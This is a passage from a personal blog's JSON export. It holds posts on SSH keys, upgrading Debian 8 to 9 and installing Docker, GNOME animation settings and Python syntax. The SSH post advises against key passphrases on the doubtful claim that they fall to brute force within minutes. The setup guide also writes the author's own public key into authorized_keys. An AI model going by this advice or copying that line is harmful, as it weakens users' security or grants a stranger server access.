compromised)\n\nEdit:  I feel this post is incomplete without mentioning key passphrases.\nCryptographic keys like this can be signed with a passphrase as a second factor\nof authentication, but this only provides a slight advantage over leaving the\npassword blank, and in my opinion is too inconvenient except for the most\nworrisome and dire circumstances. Having a key passphrase prevents someone who\ndoesn’ t know it from accessing the relevant account even if the keys are stolen\n. This sounds great, but depending on the strength of the passphrase (of which\nan increase in strength leads to a great decrease in convenience), it will\nprobably be able to be brute forced in a matter of minutes.\n\nSo yes, technically, if you discover that someone has stolen your keys within a\nfew minutes of them doing so, and you have a passphrase, you can log in very\nquickly and change the keys. However, the chances of you knowing that your keys\nwere stolen and also having the opportunity to log in before the attacker has a\nchance to use them are slim to none. Hence I would not recommend accepting the\ninconvenience of using a passphrase.","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2017-10-12T21:42:51.000Z","created_by":"1","updated_at":"2017-12-07T21:48:14.000Z","updated_by":"1","published_at":"2017-10-12T21:42:51.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null},{"id":"5b8ea0567623330001332797","uuid":"2826431e-079e-4551-ad0d-64f07bd98830","title":"From Debian 8 to Debian 9 with docker in less than 15 minutes.","slug":"from-debian-8-to-debian-9-with-docker-in-less-than-15-minutes","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"\\nNot too long ago I discovered that rented servers are now cheap as hell. So I started using rented servers for experimentation and learning about new technologies, like Docker and scalable computing. I’ll admit, creating and maintaining containerized applications has probably as many pitfalls and difficulties as running the applications without containers. Indeed, one should know rather intimately how the underlying container functions rather than simply using containers as they are, because it is often more than a simple matter of running “docker-compose up”, although once setup is done, it is that simple. I digress, this is a post about setting up, not about the benefits and drawbacks of containers, I’ll save that for another time.\\n\\nUnfortunately, my chosen VPS provider, RamNode, has a strong focus on CentOS based systems. That’s not a problem, per-se. There’s nothing *wrong* with CentOS/RHEL/Fedora, it’s just *different*. I grew up on Windows, and although convincing me to switch to Ubuntu was easy, and the switch to Debian proper was necessitated thereafter by my use of outdated hardware, I don’t see the advantage of learning the Red Hat ecosystem simply for the sake of learning it. If I had a job which required me to learn CentOS, I’d switch for that reason, but as long as I’m in charge of things rather than a worker, Debian simply makes more sense. More on why this is important later.\\n\\nFirst, login with ssh to your newly established Debian 8 system, with the password provided by your VPS provider, like so: `ssh root@{IP address}`\\n\\nThen update and install some basic features. `apt update && apt upgrade sudo rsync curl -y`\\n\\nSince RamNode has a focus on CentOS (their internal systems are probably RHEL or CentOS), their Debian/Ubuntu images are quite outdated. Debian Stretch is on it’s second point-release, and Ubuntu 14.04 reaches EOL in only six months, so it makes no sense to begin a new system on Jessie or 14.04. This adds a small extra step in our process, but these three commands take up the most time out of any of these steps. You can skip this step if you’d prefer to continue on Debian 8. There’s nothing wrong with Debian 8 – it’s still supported. It just makes more sense to start a new system on Debian 9 as it’s very stable and will be supported for a number of years longer than Jessie.\\n\\n```\\ncp /etc/apt/sources.list /etc/apt/sources.list.bak    # backs up the sources list<br></br>\\ncat /etc/apt/sources.list.bak | sed 's/jessie/stretch/' > /etc/apt/sources.list # switches the sources from Jessie to Stretch<br></br>\\napt update          # updates the source URLs<br></br>\\napt full-upgrade    # this step is what actually does the upgrade by downloading, installing, and removing the necessary packages.```\\n\\nAfter that you will be migrated to Debian 9, the current stable release. This process takes several minutes, even on fast VPS systems with modern hardware. Once that’s done, you should add your non-root user. It’s always recommended to use sudo with a non-root login than to simply login as root. If you’re overconfident, you can skip these steps as well, but be warned that you could destroy your entire system with a single misplaced character, anytime you are using the system as root. Personally, I don’t trust myself to always type the correct thing, so I run these steps to establish myself as a member of the ‘sudo’ group rather than logging in as the root user itself. You should obviously replace the instances of “scott” with your name, unless your name is actually Scott, in which case this guide will be particularly handy. Also, you should change the public key to your own, unless you intend to grant me access to your machine. While I would certainly appreciate the gesture, it’s probably not what you intend to do. If you don’t already have an SSH key, see [my post here on the topic.](https://madscientists.co/2017/10/12/creating-and-using-ssh-keys/)\\n\\n```\\nmkdir -p /home/scott/.ssh<br></br>\\nuseradd -s /bin/bash -d /home/scott -G sudo scott<br></br>\\npasswd scott<br></br>\\nchown -R scott:scott /home/scott/<br></br>\\necho \\\"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICa1xQPW/kFnPrO51Mp5gWpEpRZO8d6vtrWxIIpOoFd4 scott@scotts-system\\\" > /home/scott/.ssh/authorized_keys```\\n\\nWith that I would recommend logging in as your newly created user. Assuming it’s the same user you have for your system, you can type `ssh {BOX IP}`, if you have a different username from the newly created user, type `ssh {user}@{BOX IP}`.\\n\\nFinally, it’s time to set up docker itself. Begin by installing a few prerequisite packages (`sudo apt-get install apt-transport-https ca-certificates gnupg2 software-properties-common`), add their key and repository, then update:\\n\\n```\\ncurl -fsSL https://download.docker.com/linux/$(. /etc/os-release; echo \\\"$ID\\\")/gpg | sudo apt-key add -<br></br>\\nsudo add-apt-repository \\\"deb [arch=amd64] https://download.docker.com/linux/$(. /etc/os-release; echo \\\"$ID\\\") $(lsb_release -cs) stable\\\"<br></br>\\nsudo apt update<br></br>\\nsudo apt install docker-ce```\\n\\nThat’s all! Run `docker run hello-world` to test, and if you have any issues, please, let me know in the comments; I’ll do what I can to help of course.\\n\\n\\n\"}]],\"sections\":[[10,0]]}","html":"<div class=\"kg-card-markdown\"><p>Not too long ago I discovered that rented servers are now cheap as hell. So I started using rented servers for experimentation and learning about new technologies, like Docker and scalable computing. I’ll admit, creating and maintaining containerized applications has probably as many pitfalls and difficulties as running the applications without containers. Indeed, one should know rather intimately how the underlying container functions rather than simply using containers as they are, because it is often more than a simple matter of running “docker-compose up”, although once setup is done, it is that simple. I digress, this is a post about setting up, not about the benefits and drawbacks of containers, I’ll save that for another time.</p>\n<p>Unfortunately, my chosen VPS provider, RamNode, has a strong focus on CentOS based systems. That’s not a problem, per-se. There’s nothing <em>wrong</em> with CentOS/RHEL/Fedora, it’s just <em>different</em>. I grew up on Windows, and although convincing me to switch to Ubuntu was easy, and the switch to Debian proper was necessitated thereafter by my use of outdated hardware, I don’t see the advantage of learning the Red Hat ecosystem simply for the sake of learning it. If I had a job which required me to learn CentOS, I’d switch for that reason, but as long as I’m in charge of things rather than a worker, Debian simply makes more sense. More on why this is important later.</p>\n<p>First, login with ssh to your newly established Debian 8 system, with the password provided by your VPS provider, like so: <code>ssh root@{IP address}</code></p>\n<p>Then update and install some basic features. <code>apt update &amp;&amp; apt upgrade sudo rsync curl -y</code></p>\n<p>Since RamNode has a focus on CentOS (their internal systems are probably RHEL or CentOS), their Debian/Ubuntu images are quite outdated. Debian Stretch is on it’s second point-release, and Ubuntu 14.04 reaches EOL in only six months, so it makes no sense to begin a new system on Jessie or 14.04. This adds a small extra step in our process, but these three commands take up the most time out of any of these steps. You can skip this step if you’d prefer to continue on Debian 8. There’s nothing wrong with Debian 8 – it’s still supported. It just makes more sense to start a new system on Debian 9 as it’s very stable and will be supported for a number of years longer than Jessie.</p>\n<pre><code>cp /etc/apt/sources.list /etc/apt/sources.list.bak    # backs up the sources list&lt;br&gt;&lt;/br&gt;\ncat /etc/apt/sources.list.bak | sed 's/jessie/stretch/' &gt; /etc/apt/sources.list # switches the sources from Jessie to Stretch&lt;br&gt;&lt;/br&gt;\napt update          # updates the source URLs&lt;br&gt;&lt;/br&gt;\napt full-upgrade    # this step is what actually does the upgrade by downloading, installing, and removing the necessary packages.```\n\nAfter that you will be migrated to Debian 9, the current stable release. This process takes several minutes, even on fast VPS systems with modern hardware. Once that’s done, you should add your non-root user. It’s always recommended to use sudo with a non-root login than to simply login as root. If you’re overconfident, you can skip these steps as well, but be warned that you could destroy your entire system with a single misplaced character, anytime you are using the system as root. Personally, I don’t trust myself to always type the correct thing, so I run these steps to establish myself as a member of the ‘sudo’ group rather than logging in as the root user itself. You should obviously replace the instances of “scott” with your name, unless your name is actually Scott, in which case this guide will be particularly handy. Also, you should change the public key to your own, unless you intend to grant me access to your machine. While I would certainly appreciate the gesture, it’s probably not what you intend to do. If you don’t already have an SSH key, see [my post here on the topic.](https://madscientists.co/2017/10/12/creating-and-using-ssh-keys/)\n\n</code></pre>\n<p>mkdir -p /home/scott/.ssh<br></br><br>\nuseradd -s /bin/bash -d /home/scott -G sudo scott<br></br><br>\npasswd scott<br></br><br>\nchown -R scott:scott /home/scott/<br></br><br>\necho &quot;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICa1xQPW/kFnPrO51Mp5gWpEpRZO8d6vtrWxIIpOoFd4 scott@scotts-system&quot; &gt; /home/scott/.ssh/authorized_keys```</p>\n<p>With that I would recommend logging in as your newly created user. Assuming it’s the same user you have for your system, you can type <code>ssh {BOX IP}</code>, if you have a different username from the newly created user, type <code>ssh {user}@{BOX IP}</code>.</p>\n<p>Finally, it’s time to set up docker itself. Begin by installing a few prerequisite packages (<code>sudo apt-get install apt-transport-https ca-certificates gnupg2 software-properties-common</code>), add their key and repository, then update:</p>\n<pre><code>curl -fsSL https://download.docker.com/linux/$(. /etc/os-release; echo &quot;$ID&quot;)/gpg | sudo apt-key add -&lt;br&gt;&lt;/br&gt;\nsudo add-apt-repository &quot;deb [arch=amd64] https://download.docker.com/linux/$(. /etc/os-release; echo &quot;$ID&quot;) $(lsb_release -cs) stable&quot;&lt;br&gt;&lt;/br&gt;\nsudo apt update&lt;br&gt;&lt;/br&gt;\nsudo apt install docker-ce```\n\nThat’s all! Run `docker run hello-world` to test, and if you have any issues, please, let me know in the comments; I’ll do what I can to help of course.\n\n\n</code></pre>\n</div>","amp":"674","plaintext":"Not too long ago I discovered that rented servers are now cheap as hell. So I\nstarted using rented servers for experimentation and learning about new\ntechnologies, like Docker and scalable computing. I’ll admit, creating and\nmaintaining containerized applications has probably as many pitfalls and\ndifficulties as running the applications without containers. Indeed, one should\nknow rather intimately how the underlying container functions rather than simply\nusing containers as they are, because it is often more than a simple matter of\nrunning “docker-compose up”, although once setup is done, it is that simple. I\ndigress, this is a post about setting up, not about the benefits and drawbacks\nof containers, I’ll save that for another time.\n\nUnfortunately, my chosen VPS provider, RamNode, has a strong focus on CentOS\nbased systems. That’s not a problem, per-se. There’s nothingwrong  with\nCentOS/RHEL/Fedora, it’s justdifferent. I grew up on Windows, and although\nconvincing me to switch to Ubuntu was easy, and the switch to Debian proper was\nnecessitated thereafter by my use of outdated hardware, I don’t see the\nadvantage of learning the Red Hat ecosystem simply for the sake of learning it.\nIf I had a job which required me to learn CentOS, I’d switch for that reason,\nbut as long as I’m in charge of things rather than a worker, Debian simply makes\nmore sense. More on why this is important later.\n\nFirst, login with ssh to your newly established Debian 8 system, with the\npassword provided by your VPS provider, like so: ssh root@{IP address}\n\nThen update and install some basic features. apt update && apt upgrade sudo\nrsync curl -y\n\nSince RamNode has a focus on CentOS (their internal systems are probably RHEL or\nCentOS), their Debian/Ubuntu images are quite outdated. Debian Stretch is on\nit’s second point-release, and Ubuntu 14.04 reaches EOL in only six months, so\nit makes no sense to begin a new system on Jessie or 14.04. This adds a small\nextra step in our process, but these three commands take up the most time out of\nany of these steps. You can skip this step if you’d prefer to continue on Debian\n8. There’s nothing wrong with Debian 8 – it’s still supported. It just makes\nmore sense to start a new system on Debian 9 as it’s very stable and will be\nsupported for a number of years longer than Jessie.\n\ncp /etc/apt/sources.list /etc/apt/sources.list.bak    # backs up the sources list<br></br>\ncat /etc/apt/sources.list.bak | sed 's/jessie/stretch/' > /etc/apt/sources.list # switches the sources from Jessie to Stretch<br></br>\napt update          # updates the source URLs<br></br>\napt full-upgrade    # this step is what actually does the upgrade by downloading, installing, and removing the necessary packages.```\n\nAfter that you will be migrated to Debian 9, the current stable release. This process takes several minutes, even on fast VPS systems with modern hardware. Once that’s done, you should add your non-root user. It’s always recommended to use sudo with a non-root login than to simply login as root. If you’re overconfident, you can skip these steps as well, but be warned that you could destroy your entire system with a single misplaced character, anytime you are using the system as root. Personally, I don’t trust myself to always type the correct thing, so I run these steps to establish myself as a member of the ‘sudo’ group rather than logging in as the root user itself. You should obviously replace the instances of “scott” with your name, unless your name is actually Scott, in which case this guide will be particularly handy. Also, you should change the public key to your own, unless you intend to grant me access to your machine. While I would certainly appreciate the gesture, it’s probably not what you intend to do. If you don’t already have an SSH key, see [my post here on the topic.](https://madscientists.co/2017/10/12/creating-and-using-ssh-keys/)\n\n\n\nmkdir -p /home/scott/.ssh\n\n\nuseradd -s /bin/bash -d /home/scott -G sudo scott\n\n\npasswd scott\n\n\nchown -R scott:scott /home/scott/\n\n\necho \"ssh-ed25519\nAAAAC3NzaC1lZDI1NTE5AAAAICa1xQPW/kFnPrO51Mp5gWpEpRZO8d6vtrWxIIpOoFd4\nscott@scotts-system\" > /home/scott/.ssh/authorized_keys```\n\nWith that I would recommend logging in as your newly created user. Assuming it’s\nthe same user you have for your system, you can type ssh {BOX IP}, if you have a\ndifferent username from the newly created user, type ssh {user}@{BOX IP}.\n\nFinally, it’s time to set up docker itself. Begin by installing a few\nprerequisite packages (sudo apt-get install apt-transport-https ca-certificates\ngnupg2 software-properties-common), add their key and repository, then update:\n\ncurl -fsSL https://download.docker.com/linux/$(. /etc/os-release; echo \"$ID\")/gpg | sudo apt-key add -<br></br>\nsudo add-apt-repository \"deb [arch=amd64] https://download.docker.com/linux/$(. /etc/os-release; echo \"$ID\") $(lsb_release -cs) stable\"<br></br>\nsudo apt update<br></br>\nsudo apt install docker-ce```\n\nThat’s all! Run `docker run hello-world` to test, and if you have any issues, please, let me know in the comments; I’ll do what I can to help of course.","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2017-10-12T21:46:54.000Z","created_by":"1","updated_at":"2017-10-12T21:48:15.000Z","updated_by":"1","published_at":"2017-10-12T21:46:54.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null},{"id":"5b8ea0567623330001332798","uuid":"e313c16f-d816-4923-aaed-aaa883a989dc","title":"Packaging for Debian","slug":"temp-slug-52","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"\\nA few of the more advanced features of Debian, I’ve found, don’t often come with quick-start guides. They kind of expect you to read the whole documentation on the topic before you touch the task at hand. However, I’ve found them to often be overly verbose, even\\n\\n\\n\"}]],\"sections\":[[10,0]]}","html":"<div class=\"kg-card-markdown\"><p>A few of the more advanced features of Debian, I’ve found, don’t often come with quick-start guides. They kind of expect you to read the whole documentation on the topic before you touch the task at hand. However, I’ve found them to often be overly verbose, even</p>\n</div>","amp":"680","plaintext":"A few of the more advanced features of Debian, I’ve found, don’t often come with\nquick-start guides. They kind of expect you to read the whole documentation on\nthe topic before you touch the task at hand. However, I’ve found them to often\nbe overly verbose, even","feature_image":null,"featured":0,"page":0,"status":"draft","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2017-10-24T13:14:38.000Z","created_by":"1","updated_at":"2017-10-24T13:14:38.000Z","updated_by":"1","published_at":"2018-09-04T15:10:14.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null},{"id":"5b8ea0567623330001332799","uuid":"cacc1475-b969-4b77-8cdf-65cf00de1e81","title":"Disabling Animations in Ubuntu 17.10","slug":"disabling-animations-in-ubuntu-17-10","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"\\nAll of my machines are around 8-10 years old, and as such, I don’t like to have a lot of flashy animations and whatnot, because usually they just look jittery and slow down responsiveness. After being unable to get wireless working on Debian 9, and remembering the Ubuntu live disk worked straight away, I installed Ubuntu 17.10.\\n\\nHowever, I was disappointed to find a striking lack of tweaking ability in the settings menu for that sort of thing (I’m just now remembering as I write this about the various tweak-tools that would probably solve this). So I went out looking for how to do it, and there is nothing on 17.10 on forums or blogs yet. Most questions are still for 16.04, which runs Unity. So I looked it up for Gnome specifically, and found [this page](https://extensions.gnome.org/extension/119/disable-window-animations/) which mentions a configuration option “org.gnome.desktop.interface.enable-animations” which it says can be set with “gconf-editor”. However, gconf-editor wasn’t very clear on that, so I used this instead:\\n\\n`dconf write /org/gnome/desktop/interface/enable-animations false`\\n\\nAnd rebooted to find all of my animations switched off! A bit of a pain, but at least it works. I’ll probably switch back to i3 later anyway.\\n\\n\\n\"}]],\"sections\":[[10,0]]}","html":"<div class=\"kg-card-markdown\"><p>All of my machines are around 8-10 years old, and as such, I don’t like to have a lot of flashy animations and whatnot, because usually they just look jittery and slow down responsiveness. After being unable to get wireless working on Debian 9, and remembering the Ubuntu live disk worked straight away, I installed Ubuntu 17.10.</p>\n<p>However, I was disappointed to find a striking lack of tweaking ability in the settings menu for that sort of thing (I’m just now remembering as I write this about the various tweak-tools that would probably solve this). So I went out looking for how to do it, and there is nothing on 17.10 on forums or blogs yet. Most questions are still for 16.04, which runs Unity. So I looked it up for Gnome specifically, and found <a href=\"https://extensions.gnome.org/extension/119/disable-window-animations/\">this page</a> which mentions a configuration option “org.gnome.desktop.interface.enable-animations” which it says can be set with “gconf-editor”. However, gconf-editor wasn’t very clear on that, so I used this instead:</p>\n<p><code>dconf write /org/gnome/desktop/interface/enable-animations false</code></p>\n<p>And rebooted to find all of my animations switched off! A bit of a pain, but at least it works. I’ll probably switch back to i3 later anyway.</p>\n</div>","amp":"683","plaintext":"All of my machines are around 8-10 years old, and as such, I don’t like to have\na lot of flashy animations and whatnot, because usually they just look jittery\nand slow down responsiveness. After being unable to get wireless working on\nDebian 9, and remembering the Ubuntu live disk worked straight away, I installed\nUbuntu 17.10.\n\nHowever, I was disappointed to find a striking lack of tweaking ability in the\nsettings menu for that sort of thing (I’m just now remembering as I write this\nabout the various tweak-tools that would probably solve this). So I went out\nlooking for how to do it, and there is nothing on 17.10 on forums or blogs yet.\nMost questions are still for 16.04, which runs Unity. So I looked it up for\nGnome specifically, and foundthis page\n[https://extensions.gnome.org/extension/119/disable-window-animations/]  which\nmentions a configuration option “org.gnome.desktop.interface.enable-animations”\nwhich it says can be set with “gconf-editor”. However, gconf-editor wasn’t very\nclear on that, so I used this instead:\n\ndconf write /org/gnome/desktop/interface/enable-animations false\n\nAnd rebooted to find all of my animations switched off! A bit of a pain, but at\nleast it works. I’ll probably switch back to i3 later anyway.","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2017-11-04T16:45:23.000Z","created_by":"1","updated_at":"2017-11-04T16:45:23.000Z","updated_by":"1","published_at":"2017-11-04T16:45:23.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null},{"id":"5b8ea056762333000133279a","uuid":"aa667787-a2ee-4325-8b2a-239528478b59","title":"F-Strings are F-ing awesome (new python feature)","slug":"f-strings","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"\\nNo, this doesn’t mean Python has introduced a new way to curse, although it wouldn’t surprise me terribly if they did do so, the brilliant fuckers. This is about an exciting new feature in Python 3.6: formatted string literals. In previous versions of python, one would have to either construct a string prior to acting on it in the case of using variables and functions to create it:\\n\\n```\\nstring = \\\"value: \\\" + x<br></br>\\nprint(string)```\\n\\n…or use the .format() function of the string class:\\n\\n`print(\\\"value: {0}\\\".format(x))`\\n\\nWhereas in Python 3.6 we can now simply do something like this:\\n\\n```\\nx=the_value_to_assign<br></br>\\nprint(f\\\"value: {x}\\\")```\\n\\nThis actually supports even more than simple variable substitution. For more info, see the [python documentation](https://docs.python.org/2/library/string.html#format-string-syntax).\\n\\nEdit: A quick side-by-side of some code I’ve been writing before and after using an f-string\\n\\n<figure class=\\\"wp-caption aligncenter\\\" id=\\\"attachment_697\\\" style=\\\"width: 426px\\\">[![B4 F-String](https://madscientists.co/wp-content/uploads/2017/11/beforeFstrings-300x50.png)](https://madscientists.co/wp-content/uploads/2017/11/beforeFstrings.png)<figcaption class=\\\"wp-caption-text\\\">A snippit from before implementing F-strings</figcaption></figure><figure class=\\\"wp-caption aligncenter\\\" id=\\\"attachment_698\\\" style=\\\"width: 315px\\\">[![After F-Strings](https://madscientists.co/wp-content/uploads/2017/11/afterFstrings-300x98.png)](https://madscientists.co/wp-content/uploads/2017/11/afterFstrings.png)<figcaption class=\\\"wp-caption-text\\\">A snippit from after implementing Python3.6’s F-strings</figcaption></figure>\\n\"}]],\"sections\":[[10,0]]}","html":"<div class=\"kg-card-markdown\"><p>No, this doesn’t mean Python has introduced a new way to curse, although it wouldn’t surprise me terribly if they did do so, the brilliant fuckers. This is about an exciting new feature in Python 3.6: formatted string literals. In previous versions of python, one would have to either construct a string prior to acting on it in the case of using variables and functions to create it:</p>\n<pre><code>string = &quot;value: &quot; + x&lt;br&gt;&lt;/br&gt;\nprint(string)```\n\n…or use the .format() function of the string class:\n\n`print(&quot;value: {0}&quot;.format(x))`\n\nWhereas in Python 3.6 we can now simply do something like this:\n\n</code></pre>\n<p>x=the_value_to_assign<br></br><br>\nprint(f&quot;value: {x}&quot;)```</p>\n<p>This actually supports even more than simple variable substitution. For more info, see the <a href=\"https://docs.python.org/2/library/string.html#format-string-syntax\">python documentation</a>.</p>\n<p>Edit: A quick side-by-side of some code I’ve been writing before and after using an f-string</p>\n<figure class=\"wp-caption aligncenter\" id=\"attachment_697\" style=\"width: 426px\">[![B4 F-String](https://madscientists.co/wp-content/uploads/2017/11/beforeFstrings-300x50.png)](https://madscientists.co/wp-content/uploads/2017/11/beforeFstrings.png)<figcaption class=\"wp-caption-text\">A snippit from before implementing F-strings</figcaption></figure><figure class=\"wp-caption aligncenter\" id=\"attachment_698\" style=\"width: 315px\">[![After F-Strings](https://madscientists.co/wp-content/uploads/2017/11/afterFstrings-300x98.png)](https://madscientists.co/wp-content/uploads/2017/11/afterFstrings.png)<figcaption class=\"wp-caption-text\">A snippit from after implementing Python3.6’s F-strings</figcaption></figure>\n</div>","amp":"685","plaintext":"No, this doesn’t mean Python has introduced a new way to curse, although it\nwouldn’t surprise me terribly if they did do so, the brilliant fuckers. This is\nabout an exciting new feature in Python 3.6: formatted string literals. In\nprevious versions of python, one would have to either construct a string prior\nto acting on it in the case of using variables and functions to create it:\n\nstring = \"value: \" + x<br></br>\nprint(string)```\n\n…or use the .format() function of the string class:\n\n`print(\"value: {0}\".format(x))`\n\nWhereas in Python 3.6 we can now simply do something like this:\n\n\n\nx=the_value_to_assign\n\n\nprint(f\"value: {x}\")```\n\nThis actually supports even more than simple variable substitution. For more\ninfo, see the python documentation.\n\nEdit: A quick side-by-side of some code I’ve been writing before and after using\nan f-string\n\n[![B4\nF-String](https://madscientists.co/wp-content/uploads/2017/11/beforeFstrings-300x50.png)](https://madscientists.co/wp-content/uploads/2017/11/beforeFstrings.png)\nA snippit from before implementing F-strings[![After\nF-Strings](https://madscientists.co/wp-content/uploads/2017/11/afterFstrings-300x98.png)](https://madscientists.co/wp-content/uploads/2017/11/afterFstrings.png)\nA snippit from after implementing Python3.6’s F-strings","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2017-11-05T09:05:24.000Z","created_by":"1","updated_at":"2017-11-10T05:54:18.000Z","updated_by":"1","published_at":"2017-11-05T09:05:24.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null},{"id":"5b8ea056762333000133279b","uuid":"a7983f54-7dbc-4b95-a077-177e82458a0a","title":"Yet another \"python is the best\" post....","slug":"yet-another-python-is-the-best-post","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"\\nI just saw a post on StackExchange asking about how to run the equivalent of the following easy-to-read python code in a more concise way:\\n\\n[pastacode lang=”python” manual=”if%20count%20%3D%3D%20N%3A%0A%20%20%20%20count%20%3D%200%0Aelse%3A%0A%20%20%20%20count%20%3D%20N%20%2B%201″ message=”Readable Python example” highlight=”” provider=”manual”/]\\n\\nIt gave this objective-C code as an example of a more concise way of putting the same code. I’ve never worked with obj-C, so I can’t tell if this is accurate, but no one on the stack-exchange page complained.\\n\\n<figure class=\\\"wp-caption alignleft\\\" id=\\\"attachment_702\\\" style=\\\"width: 300px\\\">[![obj-c example code](https://madscientists.co/wp-content/uploads/2017/11/obj-c-300x26.png)](https://madscientists.co/wp-content/uploads/2017/11/obj-c.png)<figcaption class=\\\"wp-caption-text\\\">The equivalent concise example of Objective-C code</figcaption></figure>This looks, to me, absurd. I realize the desire to make simple expressions like the one above more concise when writing, but trying to read that, I can hardly parse it knowing what it does. By contrast, the answer to the more concise way to do that in python is only slightly confusing:\\n\\n[pastacode lang=”python” manual=”count%20%3D%200%20if%20count%20%3D%3D%20N%20else%20N%20%2B%201″ message=”More consise Python example” highlight=”” provider=”manual”/]\\n\\nThis sacrifices a whole one character for the if statement, and three for the else, to be a *lot* more readable, and readability is an important element of writing code that has fewer bugs.\\n\\nNote, I’m not comparing two different styles here. The first example is obviously stylistically written to value readability over conciseness. What I’m comparing here are the two one-liners, both of which value conciseness of code over readability. The use of the *if* keyword as opposed to the *?* operator is much more readable as a general style, and even more obviously so with the *: *and *else* operators, while still being relatively concise.\\n\\n\\n\"}]],\"sections\":[[10,0]]}","html":"<div class=\"kg-card-markdown\"><p>I just saw a post on StackExchange asking about how to run the equivalent of the following easy-to-read python code in a more concise way:</p>\n<p>[pastacode lang=”python” manual=”if%20count%20%3D%3D%20N%3A%0A%20%20%20%20count%20%3D%200%0Aelse%3A%0A%20%20%20%20count%20%3D%20N%20%2B%201″ message=”Readable Python example” highlight=”” provider=”manual”/]</p>\n<p>It gave this objective-C code as an example of a more concise way of putting the same code. I’ve never worked with obj-C, so I can’t tell if this is accurate, but no one on the stack-exchange page complained.</p>\n<figure class=\"wp-caption alignleft\" id=\"attachment_702\" style=\"width: 300px\">[![obj-c example code](https://madscientists.co/wp-content/uploads/2017/11/obj-c-300x26.png)](https://madscientists.co/wp-content/uploads/2017/11/obj-c.png)<figcaption class=\"wp-caption-text\">The equivalent concise example of Objective-C code</figcaption></figure>This looks, to me, absurd. I realize the desire to make simple expressions like the one above more concise when writing, but trying to read that, I can hardly parse it knowing what it does. By contrast, the answer to the more concise way to do that in python is only slightly confusing:\n<p>[pastacode lang=”python” manual=”count%20%3D%200%20if%20count%20%3D%3D%20N%20else%20N%20%2B%201″ message=”More consise Python example” highlight=”” provider=”manual”/]</p>\n<p>This sacrifices a whole one character for the if statement, and three for the else, to be a <em>lot</em> more readable, and readability is an important element of writing code that has fewer bugs.</p>\n<p>Note, I’m not comparing two different styles here. The first example is obviously stylistically written to value readability over conciseness. What I’m comparing here are the two one-liners, both of which value conciseness of code over readability. The use of the <em>if</em> keyword as opposed to the <em>?</em> operator is much more readable as a general style, and even more obviously so with the *: *and <em>else</em> operators, while still being relatively concise.</p>\n</div>","amp":"701","plaintext":"I just saw a post on StackExchange asking about how to run the equivalent of the\nfollowing easy-to-read python code in a more concise way:\n\n[pastacode lang=”python”\nmanual=”if%20count%20%3D%3D%20N%3A%0A%20%20%20%20count%20%3D%200%0Aelse%3A%0A%20%20%20%20count%20%3D%20N%20%2B%201″\nmessage=”Readable Python example” highlight=”” provider=”manual”/]\n\nIt gave this objective-C code as an example of a more concise way of putting the\nsame code. I’ve never worked with obj-C, so I can’t tell if this is accurate,\nbut no one on the stack-exchange page complained.\n\n[![obj-c example\ncode](https://madscientists.co/wp-content/uploads/2017/11/obj-c-300x26.png)](https://madscientists.co/wp-content/uploads/2017/11/obj-c.png)\nThe equivalent concise example of Objective-C codeThis looks, to me, absurd. I\nrealize the desire to make simple expressions like the one above more concise\nwhen writing, but trying to read that, I can hardly parse it knowing what it\ndoes. By contrast, the answer to the more concise way to do that in python is\nonly slightly confusing:[pastacode lang=”python”\nmanual=”count%20%3D%200%20if%20count%20%3D%3D%20N%20else%20N%20%2B%201″\nmessage=”More consise Python example” highlight=”” provider=”manual”/]\n\nThis sacrifices a whole one character for the if statement, and three for the\nelse, to be a lot  more readable, and readability is an important element of\nwriting code that has fewer bugs.\n\nNote, I’m not comparing two different styles here. The first example is\nobviously stylistically written to value readability over conciseness. What I’m\ncomparing here are the two one-liners, both of which value conciseness of code\nover readability. The use of the if  keyword as opposed to the ?  operator is\nmuch more readable as a general style, and even more obviously so with the *:\n*and else  operators, while still being relatively 